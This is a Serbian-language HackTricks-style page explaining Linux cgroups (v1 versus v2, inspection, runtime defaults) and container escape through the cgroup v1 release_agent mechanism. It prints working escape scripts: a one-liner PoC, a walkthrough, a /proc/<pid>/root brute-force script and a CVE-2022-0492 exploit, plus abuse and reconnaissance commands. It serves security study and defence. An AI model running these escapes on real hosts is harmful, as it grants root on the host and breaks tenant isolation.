# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

Linux **control groups** su mehanizam kernela koji se koristi za grupisanje procesa radi obračuna, ograničavanja, određivanja prioriteta i sprovođenja pravila. Ako se namespaces uglavnom odnose na izolovanje prikaza resursa, cgroups se uglavnom koriste za upravljanje time **koliko** tih resursa određeni skup procesa sme da potroši i, u nekim slučajevima, **sa kojim klasama resursa** uopšte sme da stupa u interakciju. Containers se neprekidno oslanjaju na cgroups, čak i kada ih korisnik nikada direktno ne pregleda, jer je gotovo svakom modernom runtime-u potreban način da kaže kernelu: "ovi procesi pripadaju ovom workload-u, a na njih se primenjuju ova pravila za resurse".

Zbog toga container engines smeštaju novi container u sopstveno cgroup podstablo. Kada se stablo procesa tamo nađe, runtime može da ograniči memoriju, ograniči broj PID-ova, odredi težinu korišćenja CPU-a, reguliše I/O i ograniči pristup uređajima. U production okruženju, ovo je ključno i za bezbednost u okruženjima sa više tenant-a i za osnovnu operativnu urednost. Container bez smislenih kontrola resursa može da iscrpi memoriju, preplavi sistem procesima ili monopolizuje CPU i I/O na načine koji host ili susedne workload-e čine nestabilnim.

Iz bezbednosne perspektive, cgroups su važni na dva odvojena načina. Prvo, loša ili nedostajuća ograničenja resursa omogućavaju jednostavne denial-of-service napade. Drugo, neke cgroup funkcije, naročito u starijim **cgroup v1** postavkama, istorijski su stvarale moćne breakout primitive kada su bile upisive iznutra container-a.

## v1 naspram v2

U upotrebi postoje dva glavna cgroup modela. **cgroup v1** izlaže više controller hijerarhija, a stariji exploit writeup-ovi često se zasnivaju na čudnim i ponekad previše moćnim semantikama koje su tamo dostupne. **cgroup v2** uvodi objedinjenu hijerarhiju i generalno čistije ponašanje. Moderne distribucije sve više preferiraju cgroup v2, ali mešovita ili legacy okruženja i dalje postoje, što znači da su oba modela i dalje relevantna pri analizi stvarnih sistema.

Razlika je važna zato što su neke od najpoznatijih priča o container breakout-u, kao što je zloupotreba **`release_agent`** u cgroup v1, veoma specifično povezane sa starijim ponašanjem cgroup-a. Čitalac koji vidi cgroup exploit na blogu i zatim ga naslepo primeni na moderan sistem koji koristi isključivo cgroup v2 verovatno neće pravilno razumeti šta je na targetu zaista moguće.

## Inspekcija

Najbrži način da vidite gde se nalazi vaša trenutna shell sesija jeste:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Datoteka `/proc/self/cgroup` prikazuje putanje cgroup-a povezane sa trenutnim procesom. Na modernom hostu sa cgroup v2 često ćete videti unified unos. Na starijim ili hibridnim hostovima možete videti više putanja kontrolera za v1. Kada saznate putanju, možete pregledati odgovarajuće datoteke u okviru `/sys/fs/cgroup` da biste videli ograničenja i trenutnu upotrebu.

Na hostu sa cgroup v2 korisne su sledeće komande:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Ove datoteke otkrivaju koji kontroleri postoje i koji su delegirani podređenim cgroup-ovima. Ovaj model delegiranja je važan u rootless okruženjima i okruženjima kojima upravlja systemd, gde runtime možda može da kontroliše samo podskup cgroup funkcionalnosti koji nadređena hijerarhija zaista delegira.

## Lab

Jedan od načina da se cgroups posmatraju u praksi jeste pokretanje memory-limited container-a:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Možete takođe pokušati sa kontejnerom ograničenim po PID-u:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Ovi primeri su korisni jer pomažu da se runtime flag poveže sa kernel file interfejsom. Runtime ne primenjuje pravilo magijom; on upisuje relevantna cgroup podešavanja, a zatim prepušta kernelu da ih primeni na stablo procesa.

## Upotreba runtime-a

Docker, Podman, containerd i CRI-O oslanjaju se na cgroups kao deo normalnog rada. Razlike se obično ne odnose na to da li koriste cgroups, već na **to koje podrazumevane vrednosti biraju**, **kako sarađuju sa systemd-om**, **kako funkcioniše rootless delegacija** i **koliko konfiguracije kontroliše engine, a koliko orchestration nivo**.

U Kubernetes-u, resource requests i limits na kraju postaju cgroup konfiguracija na node-u. Putanja od Pod YAML-a do kernel enforcement-a prolazi kroz kubelet, CRI runtime i OCI runtime, ali cgroups su i dalje kernel mehanizam koji konačno primenjuje pravilo. U Incus/LXC okruženjima cgroups se takođe intenzivno koriste, naročito zato što system containers često izlažu bogatije stablo procesa i operativna očekivanja sličnija VM-u.

## Misconfigurations And Breakouts

Klasična cgroup security priča odnosi se na writable **cgroup v1 `release_agent`** mehanizam. U tom modelu, ako attacker može da upisuje u odgovarajuće cgroup fajlove, uključi `notify_on_release` i kontroliše putanju sačuvanu u `release_agent`, kernel može na kraju da izvrši putanju koju je izabrao attacker u initial namespaces na hostu kada cgroup postane prazan. Zato stariji writeup-i posvećuju toliko pažnje writability-ju cgroup controller-a, mount opcijama i namespace/capability uslovima.

Čak i kada `release_agent` nije dostupan, cgroup greške su i dalje važne. Preširok pristup uređajima može učiniti host uređaje dostupnim iz container-a. Nedostatak memory i PID limit-a može pretvoriti jednostavan code execution u host DoS. Slaba cgroup delegacija u rootless scenarijima takođe može navesti defendere da pretpostave da restrikcija postoji, iako runtime zapravo nikada nije mogao da je primeni.

### `release_agent` Background

`release_agent` technique primenjuje se samo na **cgroup v1**. Osnovna ideja je da, kada poslednji proces u cgroup-u izađe i kada je postavljeno `notify_on_release=1`, kernel izvršava program čija je putanja sačuvana u `release_agent`. To izvršavanje se odvija u **initial namespaces na hostu**, što writable `release_agent` pretvara u container escape primitive.

Da bi technique funkcionisala, attacker-u su uglavnom potrebni:

- writable **cgroup v1** hierarchy
- mogućnost kreiranja ili korišćenja child cgroup-a
- mogućnost postavljanja `notify_on_release`
- mogućnost upisivanja putanje u `release_agent`
- putanja koja se iz perspektive hosta razrešava do executable fajla

### Classic PoC

Istorijski one-liner PoC je:<sup>[[1]](#references)</sup>
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Ovaj PoC upisuje putanju payload-a u `release_agent`, pokreće cgroup release, a zatim čita izlazni fajl generisan na hostu.

### Walk-Through čitljiviji

Ista ideja je lakša za razumevanje kada se podeli na korake.<sup>[[1]](#references)</sup>

1. Kreirajte i pripremite cgroup sa dozvolom za upis:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifikujte putanju hosta koja odgovara datotečnom sistemu kontejnera:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Postavite payload koji će biti vidljiv sa putanje hosta:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Pokrenite izvršavanje tako što ćete učiniti cgroup praznim:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Efekat je izvršavanje payload-a na strani hosta sa root privilegijama hosta. U stvarnom exploit-u, payload obično upisuje proof fajl, pokreće reverse shell ili menja stanje hosta.

### Varijanta sa relativnom putanjom koja koristi `/proc/<pid>/root`

U nekim okruženjima putanja hosta do filesystem-a containera nije očigledna ili je sakrivena storage driver-om. U tom slučaju putanja payload-a može biti izražena kroz `/proc/<pid>/root/...`, gde je `<pid>` host PID koji pripada procesu u trenutnom containeru. To je osnova varijante brute-force napada sa relativnom putanjom:<sup>[[2]](#references)</sup>
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Relevantan trik ovde nije sam brute force, već oblik putanje: `/proc/<pid>/root/...` omogućava kernelu da razreši fajl unutar filesystema containera iz host namespace-a, čak i kada direktna putanja do host storage-a nije unapred poznata.

### CVE-2022-0492 Variant

Godine 2022, CVE-2022-0492 je pokazao da upisivanje u `release_agent` u cgroup v1 nije ispravno proveravalo `CAP_SYS_ADMIN` u **initial** user namespace-u. Zbog toga je ova tehnika bila mnogo dostupnija na ranjivim kernelima, jer je proces containera koji je mogao da mount-uje cgroup hijerarhiju mogao da upiše `release_agent` bez prethodnih privilegija u host user namespace-u.<sup>[[3]](#references)</sup>

Minimalni exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Na ranjivom kernelu, host izvršava `/proc/self/exe` sa root privilegijama hosta.

Za praktičnu zloupotrebu, počnite proverom da li okruženje i dalje izlaže writable cgroup-v1 putanje ili opasan pristup uređajima:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Ako je `release_agent` prisutan i upisiv, već ste na teritoriji legacy-breakout-a:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Ako sama cgroup putanja ne omogući escape, sledeća praktična upotreba često je denial of service ili reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Ove komande brzo pokazuju da li workload ima prostora za fork-bomb, agresivnu potrošnju memorije ili zloupotrebu upisivog legacy cgroup interfejsa.

## Provere

Prilikom pregleda targeta, svrha cgroup provera je da se utvrdi koji cgroup model se koristi, da li container vidi putanje kontrolera sa mogućnošću upisa i da li su stari breakout primitives, kao što je `release_agent`, uopšte relevantni.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Šta je ovde zanimljivo:

- Ako `mount | grep cgroup` prikazuje **cgroup v1**, stariji breakout writeups postaju relevantniji.
- Ako `release_agent` postoji i dostupan je, to odmah vredi detaljnije istražiti.
- Ako je vidljiva cgroup hijerarhija upisiva i container takođe ima jake capabilities, okruženje zaslužuje mnogo pažljiviji pregled.

Ako otkrijete **cgroup v1**, upisive controller mount-ove i container koji takođe ima jake capabilities ili slabu seccomp/AppArmor zaštitu, toj kombinaciji treba posvetiti posebnu pažnju. cgroups se često posmatraju kao nezanimljiva tema upravljanja resursima, ali su istorijski bili deo nekih od najpoučnijih container escape chain-ova, upravo zato što granica između „kontrole resursa“ i „uticaja na host“ nije uvek bila tako jasna kao što se pretpostavljalo.

## Podrazumevane postavke Runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano omogućen | Container-i se automatski smeštaju u cgroups; ograničenja resursa su opciona, osim ako se postave pomoću flag-ova | izostavljanje `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Podrazumevano omogućen | `--cgroups=enabled` je podrazumevana vrednost; podrazumevane vrednosti za cgroup namespace variraju u zavisnosti od verzije cgroup-a (`private` na cgroup v2, `host` na nekim cgroup v1 postavkama) | `--cgroups=disabled`, `--cgroupns=host`, opuštena kontrola uređaja, `--privileged` |
| Kubernetes | Podrazumevano omogućen kroz runtime | Podovi i container-i se smeštaju u cgroups pomoću node runtime-a; detaljna kontrola resursa zavisi od `resources.requests` / `resources.limits` | izostavljanje zahteva/ograničenja resursa, privileged pristup uređajima, pogrešna konfiguracija runtime-a na nivou host-a |
| containerd / CRI-O | Podrazumevano omogućen | cgroups su deo uobičajenog upravljanja životnim ciklusom | direktne runtime konfiguracije koje ublažavaju kontrole uređaja ili izlažu nasleđene upisive cgroup v1 interfejse |

Važna razlika je u tome što je **postojanje cgroup-a** obično podrazumevano, dok su **korisna ograničenja resursa** često opciona, osim ako nisu eksplicitno konfigurisana.

## Reference

- [1] [Razumevanje Docker container escape-ova](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [2] [Privileged Container Escape - Control Groups release_agent](http://blog.ajxchapman.com/containers/2020/11/19/privileged-container-escape.html)
- [3] [Nova Linux ranjivost CVE-2022-0492 koja utiče na Cgroups: Mogu li container-i pobeći?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

{{#include ../../../../banners/hacktricks-training.md}}
